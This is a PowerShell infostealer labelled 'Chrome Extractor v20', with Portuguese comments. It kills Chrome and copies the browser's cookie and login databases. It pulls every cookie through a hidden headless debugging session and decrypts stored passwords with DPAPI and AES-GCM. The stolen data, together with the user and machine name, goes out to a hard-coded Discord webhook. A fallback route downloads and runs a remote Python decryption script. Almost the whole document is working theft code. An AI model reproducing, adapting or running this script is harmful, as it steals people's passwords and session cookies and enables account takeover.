$w="https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
$d=Get-Date -Format "HH:mm:ss"
Write-Host "[$d] Chrome Extractor v20"
Write-Host "[$d] User: $env:USERNAME@$env:COMPUTERNAME"
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Ler chaves do Chrome
$state="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$ek="";$ak=""
if(Test-Path $state){$j=Get-Content $state -Raw|ConvertFrom-Json;$ek=$j.os_crypt.encrypted_key;$ak=$j.os_crypt.app_bound_encrypted_key}
Write-Host "[$d] encrypted_key: $($ek.Length -gt 0) | app_bound: $($ak.Length -gt 0)"

# Se tem app_bound, COPIA BANCOS + MANDA TUDO PARA ANALISE
$outDir="$env:TEMP\chrome_extracted"
if(!(Test-Path $outDir)){New-Item -ItemType Directory -Path $outDir -Force|Out-Null}

# Copiar Local State
Copy-Item $state "$outDir\Local State" -Force -ErrorAction SilentlyContinue

# Copiar bancos de todos os perfis
$cu="$env:LOCALAPPDATA\Google\Chrome\User Data"
foreach($pr in @("Default","Profile 1","Profile 2")){
    if(Test-Path "$cu\$pr\Cookies"){Copy-Item "$cu\$pr\Cookies" "$outDir\$pr-Cookies" -Force -ErrorAction SilentlyContinue}
    if(Test-Path "$cu\$pr\Login Data"){Copy-Item "$cu\$pr\Login Data" "$outDir\$pr-Login_Data" -Force -ErrorAction SilentlyContinue}
    if(Test-Path "$cu\$pr\Network\Cookies"){Copy-Item "$cu\$pr\Network\Cookies" "$outDir\$pr-Network-Cookies" -Force -ErrorAction SilentlyContinue}
}
Write-Host "[$d] Bancos copiados para $outDir"

# TENTAR CHROME DEBUG (funciona independente da versao)
$tmpProfile="$env:TEMP\chromedbg_"+(Get-Random -Max 99999)
New-Item -ItemType Directory -Path $tmpProfile -Force|Out-Null

# Copiar dados reais para o perfil temporario
Copy-Item $state "$tmpProfile\Local State" -Force -ErrorAction SilentlyContinue
foreach($pr2 in @("Default","Profile 1")){
    $s="$cu\$pr2";$d="$tmpProfile\$pr2"
    if(Test-Path $s){
        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue|Out-Null
        foreach($f in @("Cookies","Cookies-journal","Login Data","Login Data-journal")){
            $sf=Join-Path $s $f;$df=Join-Path $d $f
            if(Test-Path $sf){Copy-Item $sf $df -Force -ErrorAction SilentlyContinue}
        }
    }
}

$ce="$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
if(!(Test-Path $ce)){$ce="${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"}
if(!(Test-Path $ce)){$ce="$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"}

$gotCookies=$false
if(Test-Path $ce){
    $port=9222+(Get-Random -Max 1000)
    Write-Host "[$d] Iniciando Chrome debug na porta $port..."
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$ce
    $psi.Arguments="--remote-debugging-port=$port --remote-allow-origins=* --headless --user-data-dir=$tmpProfile --no-first-run --disable-features=ChromeWhatsNewUI --disable-sync --no-default-browser-check"
    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow=$true
    $psi.UseShellExecute=$false
    $proc=[System.Diagnostics.Process]::Start($psi)
    Start-Sleep -Seconds 5
    
    $wsUrl=$null
    for($att=0;$att -lt 10;$att++){
        if($wsUrl){break}
        try{$resp=Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 3 -ErrorAction SilentlyContinue;$wsUrl=$resp.webSocketDebuggerUrl}catch{}
        if(!$wsUrl){try{$list=Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 3 -ErrorAction SilentlyContinue;if($list -and $list[0]){$wsUrl=$list[0].webSocketDebuggerUrl}}catch{}}
        Start-Sleep -Seconds 1
    }
    
    if($wsUrl){
        Write-Host "[$d] WebSocket conectado!"
        $ws=New-Object System.Net.WebSockets.ClientWebSocket
        $ws.ConnectAsync([System.Uri]$wsUrl,[System.Threading.CancellationToken]::None).Wait()
        
        # Network.getAllCookies
        $msg='{"id":1,"method":"Network.getAllCookies"}'
        $ws.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($msg)),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,[System.Threading.CancellationToken]::None).Wait()
        
        $buf=[byte[]]::new(524288)
        $res=$ws.ReceiveAsync([System.ArraySegment[byte]]::new($buf),[System.Threading.CancellationToken]::None).Result
        $respStr=[System.Text.Encoding]::UTF8.GetString($buf,0,$res.Count)
        $ws.Dispose()
        
        $json=$respStr|ConvertFrom-Json
        if($json.result -and $json.result.cookies -and $json.result.cookies.Count -gt 0){
            $allCookies=$json.result.cookies
            Write-Host "[$d] DEBUG: $($allCookies.Count) cookies!"
            $gotCookies=$true
            
            $boundary="----Boundary"+[System.Guid]::NewGuid().ToString().Replace("-","")
            $body=@()
            $body+="--$boundary"
            $body+='Content-Disposition: form-data; name="payload_json"'
            $body+=""
            $body+=('{"content":"Chrome Debug | '+$env:USERNAME+'@'+$env:COMPUTERNAME+' | Cookies: '+$allCookies.Count+'"}')
            $body+="--$boundary"
            $body+='Content-Disposition: form-data; name="file"; filename="cookies.json"'
            $body+="Content-Type: application/json"
            $body+=""
            $body+=($allCookies|ConvertTo-Json -Depth 3)
            $body+="--$boundary--"
            $bodyStr=$body -join "`r`n"
            $bytes=[System.Text.Encoding]::UTF8.GetBytes($bodyStr)
            $wc=New-Object System.Net.WebClient
            $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
            $wc.UploadData($w,"POST",$bytes)|Out-Null
            $wc.Dispose()
            Write-Host "[$d] ENVIADO AO DISCORD!"
        }
    }
    
    if($proc -and !$proc.HasExited){$proc.Kill()}
    Start-Sleep -Seconds 1
}

if(Test-Path $tmpProfile){Remove-Item $tmpProfile -Recurse -Force -ErrorAction SilentlyContinue}

# Se nao conseguiu pelo debug, tenta DPAPI diretamente
if(!$gotCookies){
    Write-Host "[$d] Debug nao funcionou. Tentando DPAPI..."
    if($ek){
        $raw=[Convert]::FromBase64String($ek)
        if($raw[0] -eq 1 -and $raw.Length -gt 5){
            $mk=$null
            $mk=[System.Security.Cryptography.ProtectedData]::Unprotect($raw[5..($raw.Length-1)],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            if($mk -and $mk.Length -ge 32){
                $mk=$mk[0..31]
                Write-Host "[$d] DPAPI OK! Chave: $([System.BitConverter]::ToString($mk).Replace('-','').Substring(0,16))..."
                
                Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction SilentlyContinue
                $allCookies=@()
                $allLogins=@()
                
                foreach($pr3 in @("Default","Profile 1")){
                    $cdb2="$outDir\$pr3-Cookies"
                    $ldb2="$outDir\$pr3-Login_Data"
                    
                    if(Test-Path $cdb2){
                        $cn=$null;$rd=$null
                        $cn=New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$cdb2")
                        $cn.Open()
                        $cmd=$cn.CreateCommand()
                        $cmd.CommandText="SELECT host_key, name, path, encrypted_value FROM cookies"
                        $rd=$cmd.ExecuteReader()
                        while($rd.Read()){
                            $eb=$rd["encrypted_value"]
                            if($eb -is [string]){continue}
                            $ea=[byte[]]$eb
                            if($ea.Length -lt 15){continue}
                            $v=$null
                            if($ea[0] -eq 1){
                                $c=$ea[3..($ea.Length-1)]
                                $dc=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $v=[System.Text.Encoding]::UTF8.GetString($dc)
                            }
                            if($ea[0] -eq 2 -or $ea[0] -eq 3){
                                $n=$ea[3..14];$cl=$ea.Length-15-16
                                if($cl -gt 0){
                                    $c=$ea[15..(15+$cl-1)];$t=$ea[(15+$cl)..($ea.Length-1)]
                                    $a=[System.Security.Cryptography.AesGcm]::new($mk,16)
                                    $r=[byte[]]::new($cl)
                                    $a.Decrypt($n,$c,$t,$r)
                                    $a.Dispose()
                                    $v=[System.Text.Encoding]::UTF8.GetString($r)
                                }
                            }
                            if($v){$allCookies+=@{host=$rd["host_key"];name=$rd["name"];value=$v;path=$rd["path"]}}
                        }
                        if($rd){$rd.Close()}
                        if($cn){$cn.Close()}
                    }
                    
                    if(Test-Path $ldb2){
                        $cn2=$null;$rd2=$null
                        $cn2=New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$ldb2")
                        $cn2.Open()
                        $cmd2=$cn2.CreateCommand()
                        $cmd2.CommandText="SELECT origin_url, username_value, password_value FROM logins"
                        $rd2=$cmd2.ExecuteReader()
                        while($rd2.Read()){
                            $pb=$rd2["password_value"]
                            if($pb -is [string]){$pb=[System.Text.Encoding]::UTF8.GetBytes($pb)}
                            if($pb.Length -lt 15){continue}
                            $v=$null
                            if($pb[0] -eq 1){
                                $c=$pb[3..($pb.Length-1)]
                                $dc=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $v=[System.Text.Encoding]::UTF8.GetString($dc)
                            }
                            if($pb[0] -eq 2 -or $pb[0] -eq 3){
                                $n=$pb[3..14];$cl=$pb.Length-15-16
                                if($cl -gt 0){
                                    $c=$pb[15..(15+$cl-1)];$t=$pb[(15+$cl)..($pb.Length-1)]
                                    $a=[System.Security.Cryptography.AesGcm]::new($mk,16)
                                    $r=[byte[]]::new($cl)
                                    $a.Decrypt($n,$c,$t,$r)
                                    $a.Dispose()
                                    $v=[System.Text.Encoding]::UTF8.GetString($r)
                                }
                            }
                            if($v){$allLogins+=@{url=$rd2["origin_url"];username=$rd2["username_value"];password=$v}}
                        }
                        if($rd2){$rd2.Close()}
                        if($cn2){$cn2.Close()}
                    }
                }
                
                Write-Host "[$d] DPAPI: $($allCookies.Count) cookies, $($allLogins.Count) logins"
                
                if($allCookies.Count -gt 0 -or $allLogins.Count -gt 0){
                    $boundary="----Boundary"+[System.Guid]::NewGuid().ToString().Replace("-","")
                    $body=@()
                    $body+="--$boundary"
                    $body+='Content-Disposition: form-data; name="payload_json"'
                    $body+=""
                    $body+=('{"content":"Chrome DPAPI | '+$env:USERNAME+'@'+$env:COMPUTERNAME+' | Cookies: '+$allCookies.Count+' | Logins: '+$allLogins.Count+'"}')
                    if($allCookies.Count -gt 0){
                        $body+="--$boundary"
                        $body+='Content-Disposition: form-data; name="file"; filename="cookies.json"'
                        $body+="Content-Type: application/json"
                        $body+=""
                        $body+=($allCookies|ConvertTo-Json -Depth 3)
                    }
                    if($allLogins.Count -gt 0){
                        $body+="--$boundary"
                        $body+='Content-Disposition: form-data; name="file"; filename="logins.json"'
                        $body+="Content-Type: application/json"
                        $body+=""
                        $body+=($allLogins|ConvertTo-Json -Depth 3)
                    }
                    $body+="--$boundary--"
                    $bodyStr=$body -join "`r`n"
                    $bytes=[System.Text.Encoding]::UTF8.GetBytes($bodyStr)
                    $wc=New-Object System.Net.WebClient
                    $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
                    $wc.UploadData($w,"POST",$bytes)|Out-Null
                    $wc.Dispose()
                    Write-Host "[$d] ENVIADO AO DISCORD!"
                    
                    $allCookies|ConvertTo-Json -Depth 3|Out-File (Join-Path $outDir "cookies.json") -Encoding UTF8
                    $allLogins|ConvertTo-Json -Depth 3|Out-File (Join-Path $outDir "logins.json") -Encoding UTF8
                }
            }
        }
    }
}

# Verifica se tem Python + app_bound para tentar o metodo runassu
if(!$gotCookies -and $ak -and (Get-Command python -ErrorAction SilentlyContinue)){
    Write-Host "[$d] Tentando metodo Python (runassu)..."
    $sd="$env:TEMP\chrome_v20_decrypt"
    if(Test-Path $sd){Remove-Item $sd -Recurse -Force -ErrorAction SilentlyContinue}
    New-Item -ItemType Directory -Path $sd -Force|Out-Null
    
    $su="https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt_chrome_v20_cookie.py"
    $sp="$sd\decrypt.py"
    $wc=New-Object System.Net.WebClient
    $wc.DownloadFile($su,$sp)
    $wc.Dispose()
    
    if(Test-Path $sp){
        & python -m pip install windows cryptography pywin32 -q 2>&1|Out-Null
        Copy-Item $state "$sd\Local State" -Force
        foreach($pr4 in @("Default","Profile 1")){
            New-Item -ItemType Directory -Path "$sd\$pr4" -Force -ErrorAction SilentlyContinue|Out-Null
            if(Test-Path "$cu\$pr4\Cookies"){Copy-Item "$cu\$pr4\Cookies" "$sd\$pr4\Cookies" -Force -ErrorAction SilentlyContinue}
            if(Test-Path "$cu\$pr4\Login Data"){Copy-Item "$cu\$pr4\Login Data" "$sd\$pr4\Login Data" -Force -ErrorAction SilentlyContinue}
        }
        Push-Location $sd
        $pyOut=& python $sp 2>&1
        Pop-Location
        foreach($l in $pyOut){Write-Host "[PY] $l"}
        
        if(Test-Path "$sd\cookies.json"){Copy-Item "$sd\cookies.json" "$outDir\cookies.json" -Force}
        if(Test-Path "$sd\logins.json"){Copy-Item "$sd\logins.json" "$outDir\logins.json" -Force}
    }
    if(Test-Path $sd){Remove-Item $sd -Recurse -Force -ErrorAction SilentlyContinue}
}

Write-Host "[$d] Dados em: $outDir"
Write-Host "[$d] CONCLUIDO!"
